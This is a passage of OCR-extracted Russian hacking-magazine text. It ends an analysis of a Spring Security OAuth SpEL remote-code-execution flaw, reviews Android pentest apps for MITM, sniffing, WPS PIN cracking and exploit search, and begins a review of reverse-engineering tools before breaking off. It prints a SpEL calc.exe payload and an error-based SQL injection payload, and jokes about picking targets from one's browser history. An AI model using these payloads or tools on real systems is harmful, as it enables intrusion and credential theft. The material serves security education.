31:         if (!clientScopes.contains(scope)) {
32:             throw new InvalidScopeException("Invalid scope: " +
scope, clientScopes);
33:         }
34:     }
35: }

Исключение также приведет к отсутствию переданного параметра scope
в запросе.


/org/springframework/security/oauth2/provider/request/DefaultOAu-
th2RequestValidator.java
37:     if (requestScopes.isEmpty()) {
38:         throw new InvalidScopeException("Empty scope (either the
client or the user is not allowed the requested scopes)");
39:     }
40: }

Если все проверки прошли успешно, то приложение переходит к фазе непос‐
редственной авторизации.


/org/springframework/security/oauth2/provider/endpoint/Authoriza-
tionEndpoint.java
180: model.put("authorizationRequest", authorizationRequest);
181:
182: return getUserApprovalPageResponse(model, authorizationRequest,
(Authentication) principal);

Согласно  переданным  данным  метод  getUserApprovalPageResponse
перенаправляет наш вызов на страницу подтверждения дос тупа /oauth/con‐
firm_access.


AuthorizationEndpoint.java
242: private ModelAndView getUserApprovalPageResponse(Map<String,
Object> model,
243:         AuthorizationRequest authorizationRequest, Authen
tication principal) {
244:     logger.debug("Loading user approval page: " + userAp
provalPage);
245:     model.putAll(userApprovalHandler.getUserApprovalRequest(
authorizationRequest, principal));
246:     return new ModelAndView(userApprovalPage, model);
247: }





         Перенаправление на страницу /oauth/conﬁrm_access

В итоге выполнение передается в метод getAccessConfirmation класса
WhitelabelApprovalEndpoint.


/org/springframework/security/oauth2/provider/endpoint/Whitela-
belApprovalEndpoint.java
17: @SessionAttributes("authorizationRequest")
18: public class WhitelabelApprovalEndpoint {
19:
20:     @RequestMapping("/oauth/confirm_access")
21:     public ModelAndView getAccessConfirmation(Map<String, Object>
 model, HttpServletRequest request) throws Exception {
22:         String template = createTemplate(model, request);

Разумеется, перед выводом стра ницы пользователю ее нужно создать. Этим
и занимается createTemplate. В аргументе model находится сформирован‐
ный нами ранее запрос на авториза цию.


/org/springframework/security/oauth2/provider/endpoint/Whitela-
belApprovalEndpoint.java
29: protected String createTemplate(Map<String, Object> model, HttpSe
rvletRequest request) {
30:     String template = TEMPLATE;

Константа TEMPLATE содержит в себе исходный код страницы с раз ными
плейсхолдерами, которые в дальнейшем будут заменены на актуальные
для текущего юзера данные.


<html><body><h1>OAuth Approval</h1><p>Do you authorize '${author
izationRequest.clientId}' to access your protected resources?</p><
form id='confirmationForm' name='confirmationForm' action='${path}/
oauth/authorize' method='post'><input name='user_oauth_approval'
value='true' type='hidden'/>%csrf%%scopes%<label><input name='author
ize' value='Authorize' type='submit'/></label></form>%denial%</body>
</html>

Обрати внимание на %scopes%. Информация о переданной области видимос‐
ти отображается на странице.


/org/springframework/security/oauth2/provider/endpoint/Whitela-
belApprovalEndpoint.java
31:     if (model.containsKey("scopes") || request.getAttribute(
"scopes") != null) {
32:         template = template.replace("%scopes%", createScopes(
model, request)).replace("%denial%", "");
33:     }
34:     else {
35:         template = template.replace("%scopes%", "").replace(
"%denial%", DENIAL);
36:     }
...
43:     return template;
44: }

После всех манипуляций сформированный template выглядит следующим
образом:


<html><body><h1>OAuth Approval</h1><p>Do you authorize '${author
izationRequest.clientId}' to access your protected resources?</p><
form id='confirmationForm' name='confirmationForm' action='${path}/
oauth/authorize' method='post'><input name='user_oauth_approval'
value='true' type='hidden'/><input type='hidden' name='${_csrf.parame
terName}' value='${_csrf.token}' /><ul><li><div class='form‐group'>
scope.${T(java.lang.Runtime).getRuntime().exec("calc.exe")}: <input
type='radio' name='scope.${T(java.lang.Runtime).getRuntime().exec(
"calc.exe")}' value='true'>Approve</input> <input type='radio' name=
'scope.${T(java.lang.Runtime).getRuntime().exec("calc.exe")}' value=
'false' checked>Deny</input></div></li></ul><label><input name=
'authorize' value='Authorize' type='submit'/></label></form></body></
html>

Следим за приключениями нашей стро ки. Теперь она приземлилась здесь:


scope.${T(java.lang.Runtime).getRuntime().exec("calc.exe")}

А дальше подготовленный шаблон передается в SpelView.


/org/springframework/security/oauth2/provider/endpoint/Whitela-
belApprovalEndpoint.java
26: return new ModelAndView(new SpelView(template), model);

Таким образом, весь шаблон интерпретируется как выражение SpEL. Как ты
уже знаешь, он разрешает использовать конс трукции с оператором T
для вызова экземпляров java.lang.Class. Этим прекрасным фактом в оче‐
редной раз и воспользуемся — для выполнения кода через метод exec клас‐
са java.lang.Runtime. Ну а дальше все по накатанной: наш пейлоад пар‐
сится с помощью parseExpression и в итоге запускается калькулятор.





     Парсинг переданного пейлоада для выполнения команды calc.exe


SpelView.java
48: public SpelView(String template) {
49:     this.template = template;
50:     this.prefix = new RandomValueStringGenerator().generate() +
"{";
51:     this.context.addPropertyAccessor(new MapAccessor());
52:     this.resolver = new PlaceholderResolver() {
53:         public String resolvePlaceholder(String name) {
54:             Expression expression = parser.parseExpression(name);


ДЕМОСТРАЦИЯ УЯЗВИМОСТЕЙ (ВИДЕО)





               VH#40.0 Sping Security OAuth Module RCE





                 VH#40.1 Spring Messaging Module RCE


ВЫВОДЫ
Это далеко не все уязвимос ти, которые были за последнее время найдены
в Spring 2. Например, советую обра тить внимание на XXE‐уязвимость в XML‐
Beam и проблему обработки ZIP‐архи вов в модуле spring‐integration‐
zip, которая позволяет выйти из директории при распаковке спе циально
сформированных архивов.
  Похоже, исследователи серьезно взялись за фреймворк: за последние
несколько месяцев в его недрах найдено мно го серьезных проблем. Так
как речь идет о приложениях, написанных на Java, дело может осложнять
и жесткая привязка к конкрет ным версиям модулей.
  Экосистема Java известна тем, что при работе с ней нередко возникают
вопросы о частичной несовместимости старого кода с обновленными ком‐
понентами. Мне постоянно встречаются допотопные версии при ложений,
написанные именно на Java.
  В общем, если у тебя где‐то стоят приложения, написанные с исполь‐
зованием Spring 2, не зевай и своевременно обновляй их (по возможности)
или накатывай секьюрити‐патчи на существу ющие час ти своей инфраструк‐
туры.
ВЗЛОМ





                                                                         Андрей Васильков
                                                                                        редактор, фронемофил, гик,
                                                                                                                         к. м. н. и т. п.
                                                                                         angstroem@hotbox.ru



       X-TOOLS
      ANDROID  ДЛЯ

                ВЫБИРАЕМ УТИЛИТЫ
         ДЛЯ ПЕНТЕСТА СО СМАРТФОНА




Тесты на проникновение — легальный способ заниматься
настоящим взломом, да еще и получать за это деньги. Прод‐
винутый аудит безопасности обычно выполняется на ноут‐
буке с (Kali) Linux и специфическим оборудованием, но мно‐
гие бреши легко обнаружить и с помощью обычного смар‐
тфона. В этой статье мы рассмотрим 14 утилит, которые поз‐
волят тебе выполнить пентест, не доставая ноутбук из сумки.


           WARNING

                        Статья написана в исследовательских целях. Вся
                    информация носит ознакомительный характер.
                    Ни автор, ни редак ция не несет ответственности
                        за  неп равомерное  использование  упомянутых
                        в статье программ.



СКАНЕРЫ ВЕБ-РЕСУРСОВ


Начнем со сканеров веб‐приложений. Здесь у нас три утилиты, которые поз‐
волят тебе найти открытые админки, сбрутить пароль, протестировать сайт
на XSS‐уязвимости, возможность SQL‐инъекций, составить листинги катало‐
гов и многое другое.


                    Kayra the Pentester Lite

                           Где взять: Google Play
                    Протес тирован ная версия: 1.4.0
                             Раз мер: 4,7 Мбайт
                       Вер сия Android: 4.1 и выше
                            Требуется root: нет


Мобильный сканер уязвимостей веб‐при ложений. Ищет типичные ошибки
в конфигурации указанного веб‐сервера и пытается получить листинг катало‐
гов (обычно — успешно). Среди дополнительных инстру ментов есть генера‐
тор хешей и дешифровщик AES.





             Сканирование выбранно го сайта и настройки

Приложение обладает прос тыми и понятными нас трой ками. Поддерживает
HTTPS и проверяет корректность TLS. Умеет искать XSS, бру тить CGI и выпол‐
нять атаки по словарю. Может работать в фоне и в многопоточном режиме.
Содержит базу данных Google Hacks и автомати чес ки определяет известные
уязвимости.





                    От чет Kayra и экран About

По каждому пункту, отмеченному в настройках сканирования, соз дается под‐
робный отчет. На скрин шоте видно лишь его малую часть. Бес платная версия
довольно функциональ на, но иногда раздра жает рекламой (если у тебя
не стоит AdAway или другой блокировщик). В плат ной версии нет рекламы
и  ограничений, ее  стоимость на момент написания  статьи составля‐
ет 159 рублей.


                           DroidSQLi

                        Где взять: edgard.net/droidsqli
                     Протес тирован ная версия: 1.1
                             Раз мер: 705 Кбайт
                       Вер сия Android: 4.2 и выше
                            Требуется root: нет


Компактная утилита для проверки веб‐сайтов на уяз вимость к SQL‐инъ екци ям
четырех разновидностей:
 • Normal SQL injection — классичес кий вари ант с передачей параметра
  UNION ALL SELECT;
 • Error based SQL injection — использование в запросах заведомо невер‐
   ного синтаксиса для получения сооб щения об ошибке, раскрывающего
   дополнительные параметры БД;
 • Blind SQL  injection — серия запросов с ана лизом ответов  true/false
   от СУБД, позволяющая вос ста новить структуру базы данных;
 • Time based SQL injection — формирова ние допол нительных запросов,
   вызывающих приостановку СУБД на определенное время, что делает воз‐
  можным посимволь ное извлечение данных.





             Демонстрация error based SQL‐инъекции

Утилита автоматически подбира ет метод инжекта, а также использует техники
обхода фильтрации запросов.
  Для начала тестирования сайта необ ходимо вручную найти точку входа.
Обычно это адрес веб‐стра ницы, содержащий запрос вида ?id=X или ?p=X,
где  X —  целое  положитель ное  число. В нашем  примере  пейлоад
для параметра id выглядит так:


id=(SELECT 4777 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT
(4777=4777,1))),0x7170767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCH
EMA.PLUGINS GROUP BY x)a)

В Сети очень много сайтов, уяз вимых к SQL‐инъекциям. Думаю, ты легко най‐
дешь несколько таких, прос то пос мотрев историю своего браузера. Под‐
робнее об SQL‐инъекциях читай в на шей статье.


               Droidbug Admin Panel Finder FREE

                           Где взять: Google Play
                     Протес тирован ная версия: 1.4
                             Раз мер: 6,3 Мбайт
                       Вер сия Android: 2.1 и выше
                            Требуется root: нет


Утилита ищет админские панели по дефолтным адресам разных CMS. Резуль‐
тат ее работы не всегда соответствует реальному положению вещей, пос‐
кольку на популярных веб‐серверах стоят IDS и WAF. Они блокиру ют перебор
URL или перенаправляют его в honeypot, который отвечает HTTP 200 OK
на все запросы, а сам собирает инфу об атакующем.
  Однако на менее популярных сайтах с безопас ностью все очень тоскливо,
и валидная админ ская панелька находится за счи таные секунды. В платной
версии, стоимостью 139 рублей, убрана реклама и разблокирована воз‐
можность перебора по смешанному шаб лону для сай тов с под держкой
PHP/ASP/CGI/CFM/JS.





                  Ищем админки на сайтах



КОМБАЙНЫ


Интернет состоит не только из веб‐приложений, и дыры находят не только
в них. Следующая подборка инс трументов поз волит тебе искать уязвимос ти
(и эксплоиты для них) в софте и железе, выпол нять сниффинг, MITM‐атаки,
оставлять бэкдоры и делать мно го дру гих интерес ных вещей.


                                cSploit

                        Где взять: github.com/cSploit
                   Протес тирован ная версия: 1.6.6 RC2
                             Раз мер: 3,5 Мбайт
                 Тестовые сбор ки cSploit Nightly доступны здесь
                       Вер сия Android: 2.3 и выше
                            Требуется рут: ДА!
       Дополнительные требования: установить BusyBox в /system/bin


Один из самых функциональных инс трументов для сканирования сетей
и поиска уязвимостей на обнаруженных хостах. Сос тавля ет карту сети и отоб‐
ражает сведения обо всех найденных в ней устройствах. Умеет определять их
IP/MAC и вендора (по первым трем октетам MAC‐адреса), определять уста‐
новленную на них ОС, искать уяз вимос ти с помощью Metasploit framework
RPCd и брутфорсить пароли.





                  Поиск клиентов и MITM‐ата ка

Выпол няет MITM‐атаки раз ного типа через спу финг DNS (возможна замена
медиафайлов в трафике на лету, JS‐инжекты, угон сессий и захват cookie
для авторизации без вво да пароля). Также умеет дисконнектить отдельные
устройства (или отключать их скопом от точки доступа). Перехватывает тра‐
фик и сохраняет его в формате .pcap или перенаправляет, куда скажешь.





                    Модули cSploit

cSploit содержит инструмент для создания и отправки на выбранный хост
любого  TCP/UDP‐пакета.  По  ссылке  взлом  роутера  перенаправляет
на онлайн‐сервис для выбора и экс плу атации уязвимостей под опре делен‐
ную модель. База перес тала обновляться в 2015 году, но все еще сохраняет
актуальность. В моем кратком тесте на роутере ASUS, который выпускается
с конца 2016 года, в свежей прошивке (апрель 2018 года) была обнаружена
уязвимость, впервые описанная в 2009 году.





       Открытые порты и подборка экс плоитов для выбранной цели

Дополнительно cSploit помога ет соз дать на взло… не прошедшем аудит
безопасности хосте удаленный шелл и получить над ним полный контроль.
В общем, это однозначный must have для пентестеров, и не только для них.


             INFO

                             cSploit, Intercepter‐NG и другие мощ ные ][‐ути‐
                      литы заслуживают более подробно го рассмот‐
                      рения в отдельных статьях. Мы предлага ем спер‐
                       ва освоиться с базовыми принципами пентеста
                       на примере простых приложе ний, а уже затем
                       переходить на хардкор. Следи за обновлениями
                        в рубрике «Взлом»!



                                dSploit

                        Где взять: github.com/dsploit
             Протестирован ная (не вполне удач но) версия: 1.1.3с
                            Раз мер: 11,4 Мбайт
                       Вер сия Android: 2.3 и выше
                            Требуется root: ДА!
    Дополнительные требования: установить BusyBox в /system/bin, проявить
                            склонность к мазохизму


Форк cSploit от Симоне Маргарителли (Simone Margaritelli), приказавший дол‐
го жить в 2014 году. Проект так и остался в стадии бета‐версии с очень
сырым кодом. Если cSpoit у меня работал без нареканий, то последние три
версии dSploit вываливались с ошиб кой почти сразу после запуска.





                        Тот же cSploit, вид сбоку

С тех пор как Маргарителли устроился в компанию Zimperium, наработки
dSploit вошли в состав фирменной утилиты zAnti.





        Сканирование беспроводной сети и обна ружение хос тов




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 X-TOOLS    ANDROID       ДЛЯ
               ВЫБИРАЕМ УТИЛИТЫ ДЛЯ ПЕНТЕСТА
                           СО СМАРТФОНА





                                  zAnti

                        Где взять: zimperium.com/zanti
                     Протес тирован ная версия: 3.18
                             Раз мер: 24 Мбайт
                       Вер сия Android: 2.3 и выше
                            Требуется рут: ДА!
    Примечания: zAnti не работает на устройствах с про цессорами архитектуры
                                 x86 и x86_64


Мобильное приложение для пентеста от Zimperium. Более современный, ста‐
бильный и наглядный ана лог dSploit.
  Интерфейс zAnti раз делен на две час ти: ска ниро вание и MITM. В первой
секции он, подобно dSploit и оригиналь ному cSploit, мапит сеть, определяет
все хосты, их параметры и уязвимос ти.





                         Nmap’им сеть

Отдельная функция — определение уязвимостей на самом смартфоне. Сог‐
ласно отчету программы, наш тестовый Nexus 5 содержит 263 дыры, которые
уже не будут закрыты, пос кольку срок жизни девай са истек.





                 Об наружение уяз вимос тей

zAnti помогает взламывать роутеры и получать к ним полный доступ (с воз‐
можностью сменить пароль админа, задать дру гой SSID, PSK и так далее).
Используя MITM‐атаки, zAnti выявляет небезопасные элементы на трех уров‐
нях: в ОС, приложениях и нас тройках устрой ства.





                  Рас ширенный поиск уязвимостей

Ключевая особенность — формирование подробного отчета по всем прос‐
канированным элементам. Отчет содержит пояс нения и советы по устра‐
нению найденных недос татков.





                          От чет zAnti



СНИФФЕРЫ


Ни одному пентестеру не обойтись без хорошего сниф фера. Это такой же
обыденный инструмент, как нож на столе повара. Поэтому следующий раздел
статьи посвящен приложениям для перехвата и ана лиза трафика.


                          Intercepter-NG

                     Где взять: github.com/intercepter‐ng
              Протестирован ная версия: 2.1 (кон сольная — 0.8)
                             Раз мер: 5,2 Мбайт
                       Вер сия Android: 2.3 и выше
                            Требуется рут: ДА!
       Дополнительные требования: установить BusyBox в /system/bin


Продвинутый сниффер, ориентированный на выполнение MITM‐атак. Зах‐
ватывает трафик и анализирует его на лету, автомати чески определяя в нем
данные авторизации. Умеет сохранять перехваченный трафик в формате
.pcap и анализировать его поз же.





                    Сканирование и ARP spooﬁng

Среди автоматически определяемых форматов данных есть пароли и хеши
для следующих протоколов: AIM, BNC, CVS, DC++, FTP, HTTP, ICQ, IMAP, IRC,
KRB5, LDAP, MRA, MYSQL, NTLM, ORACLE, POP3, RADIUS, SMTP, SOCKS, Tel‐
net, VNC.
   Intercepter‐NG собирает из перехваченных пакетов файлы, передаваемые
по FTP, IMAP, POP3, SMB, SMTP и HTTP.





                          Capture, hijack, injections

Как cSploit и аналоги, Intercepter‐NG использует ARP‐спу финг для выпол нения
MITM. Он поддерживает SSLstrip, что поз воляет выполнять MITM‐атаки даже
с HTTPS‐трафиком, под меняя на лету HTTPS‐запросы атакуемых хостов их
HTTP‐вариантами через встроенный DNS‐прокси.
  Вдобавок он умеет определять ARP‐спуфинг в отношении тебя (полез но
при подклю чении к публичным хотспотам) и защищать от него. При нажатии
иконки в виде зонтика проверя ется ARP‐кеш.


                        Packet Capture
 • Где взять: Google Play
 • Протестированная версия: 1.4.7
 • Размер: 4,5 Мбайт
 • Версия Android: 2.3 и выше
 • Требуется root: нет

Более простой и «легальный» ана лизатор TCP/UDP‐пакетов с возможностью
перехвата HTTPS‐сессий посредством MITM. Не требует прав root, поскольку
использует встроенную в Android функцию проксирования трафика через VPN
и подмену SSL‐сертификата.





                           Захват тра фика

В Android 6.0.1 и более свежих версиях требует ся вручную добавить CA‐сер‐
тификат через настрой ки приложения.





              Добавляем сертификат Packet Capture

Packet Capture работает локально. Он не выпол няет ARP‐спуфинг, угон сес‐
сий и прочие  атаки на внешние хосты. Приложе ние позиционируется
как прокси для отладки и скачивается из официального маркета. Умеет
декодировать пакеты как Text/Hex/Urlencoded, но пока не поддерживает сжа‐
тые (gzip) HTTP‐запросы.





                 Пример декодирования трафика

С помощью Packet Capture удобно контролировать сетевую активность уста‐
новленных приложений. Он показывает не прос то объем передаваемого тра‐
фика, а что конкретно и куда отправляет каждая программа или встроенный
компонент Android, какие пакеты и с каких серверов получает в ответ.
Отличная утилита для поиска троянских закладок и назойливой рекламы.


ВСПОМОГАТЕЛЬНЫЕ УТИЛИТЫ


Если продвинутые утилиты для пентеста требуют root и BusyBox, то приложе‐
ния попроще доступны в  Play Store и работа ют на любом смартфоне
без ухищрений. ARP‐спу финг и MITM‐атаки ими не выполнить, но для ска‐
нирования беспроводной  сети, обнаружения  хос тов и  явных проблем
с безопасностью их вполне хва тает.


                      WPSApp

                           Где взять: Google Play
                    Протес тирован ная версия: 1.6.20
                             Раз мер: 3,0 Мбайт
       Версия Android: 4.1. Гораздо луч ше работает на Android 5.1 и новее
                Требуется root: желательно, но не обязательно


Эта программа сканирует эфир в поисках точек дос тупа с включенной фун‐
кцией WPS. Обнаружив такие, она пытается опробовать на них дефолтные
пины. Их немного, и они известны из мануалов производите лей роутеров.





                Об наружение хотспотов с WPS

Если пользователь не сменил дефолтный пин и не отключил WPS, то ути лита
самое большое за пять минут перебирает все извес тные значения и получает
WPA(2)‐PSK, каким бы длинным и сложным он ни был. Пароль от бес провод‐
ной сети отображается на экране и автоматически сохраняется в настрой ках
Wi‐Fi смартфона.





             Успешное получение PSK менее чем за минуту

Отмечу, что некоторые роутеры не поз воляют менять пин, заданный по умол‐
чанию.  Более  того,  иногда  он  оста ется  включенным,  даже  если
в веб‐интерфейсе роутера показывается ста тус WPS: OFF. Узнать реальное
состояние WPS поможет утилита Wiﬁ Analyzer. Подробнее про нее и WPSApp
читай в статье «Ломаем Wi‐Fi со смартфо на. Разведка и первый бой».
  С момента выхода той статьи WPSApp обновилась и стала лучше во всех
отношениях. Она знает больше пинов раз ных вендоров, быстрее перебирает
их и научилась брутфорсить в новых режимах. Утилита работает как на
рутованных смар тфонах, так и без прав root. У нее много аналогов, но все они
куда менее эффектив ные.


                            WiFiAnalyzer

                           Где взять: Google Play
                    Протес тирован ная версия: 1.8.11
                             Раз мер: 1,6 Мбайт
                       Вер сия Android: 4.1 и выше
                            Требуется root: нет


Опенсорсный и бесплатный сканер Wi‐Fi‐сетей. Очень удобная утилита
для обнаружения точек дос тупа (включая скрытые), выяснения их параметров
(MAC, вендор, канал, тип шифрования), оценки мощ ности сигнала и рассто‐
яния до них. Удален ность от роутера вычисляется по формуле для пря мой
видимости, поэтому не всегда ука зывается достаточно точно.





      Отображение скрытых сетей и оценка зашумленности каналов

WiFiAnalyzer позволяет наглядно увидеть ситуацию в эфире, отфильтровать
цели по уровню сигнала, SSID, используемой частоте (2,4/5 ГГц) и типу шиф‐
рования. Также вручную можно определить наименее зашумленный канал
по графикам двух типов: обычному и с временным накоплением.





      Оценка стабильнос ти уровня сигнала от разных точек доступа

Словом, WiFiAnalyzer — это то, с чего стоит начинать разведку в беспровод‐
ных сетях. Поиск целей с определен ными параметрами сэкономит кучу вре‐
мени при дальнейшей работе с продвинутыми утилита ми.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 X-TOOLS    ANDROID       ДЛЯ
               ВЫБИРАЕМ УТИЛИТЫ ДЛЯ ПЕНТЕСТА
                           СО СМАРТФОНА





                               Fing

                           Где взять: Google Play
                    Протес тирован ная версия: 6.7.1
                             Раз мер: 10 Мбайт
                       Вер сия Android: 4.1 и выше
                            Требуется root: нет


Часто функциональность хакерских утилит пересекается с возможностями
вполне легальных инстру ментов, которыми пользуют ся системные админис‐
траторы для наладки сетей.





           Сканирование внешних и внутренних сетевых узлов

Fing — один из  таких инс трументов. Он быс тро сканиру ет  Wi‐Fi‐сеть,
к которой тебе удалось подключиться (например, с помощью WPSApp),
и определяет все хосты. Это может быть вос требовано для проверки собс‐
твенной беспроводной сети на предмет НСД, но, согласись, иссле довать
незнакомые сети гораздо интереснее.





        Определение портов и сервисов на выб ранных хос тах

Fing выполняет расширенный анализ имен NetBIOS, UPNP и Bonjour, поэтому
точнее определяет типы устройств и показывает больше их свойств. В Fing
интегрированы утилиты ping и tracerout. Также он умеет отправлять запросы
WOL (Wake on LAN), уда ленно про буж дая «спя щие» устройства, поддержи‐
вающие эту функцию.
   Fing автоматически определяет откры тые порты и сопос тавленные им сер‐
висы. При обнаружении SMB, SSH, FTP и прочего Fing предлагает подклю‐
читься к ним, вызывая для это го внешние программы из своего меню. Если
соответствующая утилита (например, AndSMB) не установлена, то Fing откры‐
вает ссылку на ее загрузку.





        Детальная информация о сети и клиент ских устрой ствах

Дополнительные возможности программы откры ваются после регистрации
аккаунта Fing. С ним можно выполнять инвентариза цию устройств и сетей.
Еще больше функций открывается после при обретения аппаратного Fingbox.
Он умеет отсле живать подклю чение непрошеных гостей и выборочно бло‐
кировать их устрой ства, а также проверять интернет‐подключение на типич‐
ные неполадки и автоматически устра нять их.


                            NetCut

                           Где взять: Google Play
                    Протес тирован ная версия: 1.4.9
                             Раз мер: 12 Мбайт
                       Вер сия Android: 4.0 и выше
                            Требуется root: ДА!


Приложение определяет все клиент ские устройства в беспроводной сети,
а затем использует ARP‐спуфинг для их выборочного отключения или обру‐
бает связь для всех, кроме тебя. А дальше ты можешь скачивать файлы
на пол ной скорости где‐нибудь в кафеш ке, глядя, как мучаются другие
посетители.





                       NetCut — найти и кикнуть!

Шутка! Так делать некуль турно, а вот быс тро кикнуть злоумышленника, не вле‐
зая в настройки роутера, — почему бы и да? Можно не просто разово обор‐
вать связь для любого хоста, а постоянно блокировать его попытки подклю‐
читься к точке доступа, пока он не сменит MAC‐адрес (см. вкладку Jail).





             Ограничение скорос ти подключения хостов

Если кто‐то попытается сделать такой финт в отно шении твоего девайса, Net‐
Cut определит отравление ARP‐кеша и очистит его (см. NetCut Defender).
За доллар в месяц можно получить акка унт Pro, убрать рекламу и ограниче‐
ния.


СПРАВОЧНИКИ И ПОИСКОВИКИ


Напоследок расскажем о паре полезных утилит, которые не имеют прямого
отношения к взлому, а выполняют скорее вспомогательную и информацион‐
ную функцию.


                    Droidbug Exploiting FREE

                           Где взять: Google Play
                    Протес тирован ная версия: 2.0.3
                             Раз мер: 5,6 Мбайт
                      Вер сия Android: 4.0.3 и выше
                            Требуется root: нет


Приложение от Bugtraq Team. Предназна чено для поиска и скачивания экс‐
плоитов разного типа. Все они сгруппированы по типу ОС в двух основных
разделах: с локальным и удаленным исполнением. В отдельную группу
выделены аппаратные и веб‐экс плоиты, а также используемые в DoS‐атаках.





                  Карманный менеджер экспло итов

Найти и скачать нужный экс пло ит мож но из бесплатной версии программы,
а для быстрого просмотра описания потребуется уже платная версия сто‐
имостью 279 рублей.


                       Pentest Cheatsheet

                           Где взять: Google Play
                     Протес тирован ная версия: 1.02
                             Раз мер: 2,2 Мбайт
                       Вер сия Android: 4.1 и выше
                            Требуется рут: нет


Карманный справоч ник пентестера. Содержит рекомендации по выполнению
тестов от OWASP (The Open Web Application Security Project) — экспертов
открытого проекта обеспечения безопас ности веб‐приложений.





                Pentest Cheatsheet — спра вочник пентестера

Дополнительно включает в себя подборку ссы лок на проверенные ][‐утилиты,
сгруппированных исходя из пос тавленной задачи: онлайновые сканеры, ана‐
лизаторы уязвимостей, тулзы для реверса, фаззеры, краулеры и так далее.





             Подборка ссылок на ути литы по типам задач

Вся  информация  хорошо  систематизирована  и  выглядит  актуальной
на момент написания статьи.


ВМЕСТО ВЫВОДОВ


Из гор хлама, мусора и откровенного фейка, который в мире Android выдают
за «хакерский софт», мы постарались выудить самые интересные, прод‐
винутые и полезные инс трументы. Но если ты считаешь, что чего‐то не хва‐
тает, — добро пожаловать в коммента рии! Только, пожалуйста, без  Kali
NetHunter, мы про него уже писали.


        WWW

                    •Проект cSploit
                    •Подробный мануал по zAnti
                    •Сервис для скачивания APK из Google.Play
    ВЗЛОМ

 ОТМЫЧКИ
 ДЛЯ СОФТА





               ВЫБИРАЕМ ИНСТРУМЕНТЫ
                     РЕВЕРСА И ПЕНТЕСТА
              ПРИЛОЖЕНИЙ ДЛЯ ANDROID





     За десять лет существо вания Android раз‐
     работчики приложений и те, кто эти при‐
     ложения взламывает, обзавелись массой
     инструментов, нап равленных друг про тив
     друга. О том, какими способами можно          Евгений Зобнин                                                                                                Редактор Unixoid и Mobile
     защитить свое приложение, мы уже погово‐              zobnin@glc.ru
     рили, а сегодня у нас обзор инструментов
     для взлома и реверса приложений.


      Условно все инструменты анализа и реверса приложений (не только для An‐
        droid) можно разделить на две груп пы:
        • инструменты для статичес кого анализа — дизассемблеры, декомпилято‐
          ры, деобфускаторы и любые другие утилиты, которые работают с кодом,
         не запуская его;
        • инструменты для динамического анализа — инстру менты, с помощью
         которых приложение можно запустить на виртуальном или реальном
         устройстве и проанализировать его поведение.

     В обеих группах есть утилиты и для самых маленьких (запустил — получил
      список уязвимостей), и для матерых пентестеров. Мы рас смотрим их все.


     СТАТИЧЕСКИЙ АНАЛИЗ
       Итак, для начала погово рим об инстру ментах статического анализа. Каждый
      пентестер должен иметь в своем арсенале хотя бы два из них. Это деком‐
      пилятор и дизассемблер.
        Декомпилятор нужен, чтобы перегнать байт‐код Dalvik обратно в код Java
      и с его помощью разоб рать ся, как работа ет приложение. Дизассемблер
       транслирует байт‐код в гораздо более низкоуровневый код Smali (местный
      ассемблер), в котором труднее разоб раться, но зато он всегда корректен
      настолько, что его можно соб рать обратно в приложение. Этой особен‐
      ностью можно восполь зоваться, например, чтобы внедрить в приложе ние
      собственный код, как мы это сделали во вто рой части статьи о взломе при‐
      ложений для Android.
          Также пригодится деобфуска тор. Он сделает декомпилированный код
      немного более читаемым. О том, что такое обфуска ция и деобфускация, мы
       также уже писали в треть ей час ти статьи о взломе приложений.


      Jadx
      Первый инструмент в нашем списке — декомпилятор Jadx. Это активно раз‐
      виваемый открытый декомпилятор, который выдает достаточно неплохой код
       Java на выходе и даже имеет функцию деобфуска ции кода. Работать с ним
      просто: запускаешь Jadx‐gui, с его помощью выбираешь APK‐файл при ложе‐
      ний и видишь иерархию пакетов и файлы с исходни ками на Java.
          Jadx может работать и в режиме командной строки. Например, сле дующая
      команда декомпилирует приложение example.apk и поместит полученный код
       Java в каталог out:


       $ jadx ‐d out example.apk

      Более того, Jadx может дополнительно сгенерировать файлы build.gradle,
       чтобы исходники можно было импортировать в Android Studio:


       $ jadx ‐e ‐d out example.apk

     Собрать приложение из них не получится, зато анализировать код будет
       гораздо удобнее.





                                    Jadx в черном


      Apktool
      Второй инструмент, который должен обязатель но быть на твоем дис ке, —
       это Apktool. Его назначение — разборка и сборка приложе ний. При этом тер‐
      мин  «разборка» подразумевает  дизассемблирова ние  кода приложения
       в файлы формата  Smali,  а  также  декомпрессию  ресурсов  и файла
        AndroidManifest.xml.
       С помощью Apktool можно разобрать приложение, проанализировать
      дизассемблерный код, внес ти в него правки и собрать обратно. О том,
       как это сделать, мы подробно писали в статье «Ломаем Android».





                     Разбираем приложение с помощью Apktool


     APKiD
      Эта небольшая утилита понадо бит ся тебе, когда ты заметишь, что Jadx не в
      состоянии декомпилировать приложение. В большинстве случаев это значит,
       что приложение было обфусцировано или упа кова но с помощью специальных
      инструментов. APKiD поз воля ет узнать, какие конкретно инструменты были
      использованы, выяснить, было ли приложение пересобрано с помощью Apk‐
        tool и используются ли в нем какие‐то другие техники для защиты от дизас‐
      семблирования/декомпиляции и запуска в вир туаль ной машине.
         APKiD далеко не всегда работает корректно, а в некоторых случаях вооб‐
     ще не выводит никакой информации на экран. Но он может помочь, если ты
       в тупике — вывод утилиты понятный. Например:
        • anti_debug : Debug.isDebuggerConnected() check — проверка,
         подклю чен ли дебаггер с помощью метода isDebuggerConnected;
        • anti_vm : Build.MANUFACTURER check — проверка производителя
        смартфона, чтобы понять, что находишься в виртуальной машине.

     Но есть одно неочевидное поле: compiler. Оно обычно содержит dx или dexlib.
      Dx — стандартный компилятор Android SDK, а dexlib — это библиотека сборки
      файлов DEX из Apktool. Проще говоря, если в поле compiler находится dexlib,
       значит, приложе ние было пересобрано с помощью Apktool или аналогичного
      инструмента.





             Результат работы APKiD для нескольких образцов малвари


       Simplify
       Что, если APKiD сооб щает о применении обфускатора, а при попытке изучить
      код ты сталкиваешься с зашифрованными строками? В этом случае тебе
      нужен деобфускатор, который сможет сделать код более читаемым. Абсолют‐
      ное большинство деобфуска торов, которые ты найдешь в интерне те, умеют
      бороться только с одним или несколькими обфуска торами, зачастую устарев‐
      ших версий.
           Simplify — универ сальный деобфускатор. Вместо того чтобы искать в коде
       знакомые паттерны, он запус кает код в вир туальной среде и дает ему воз‐
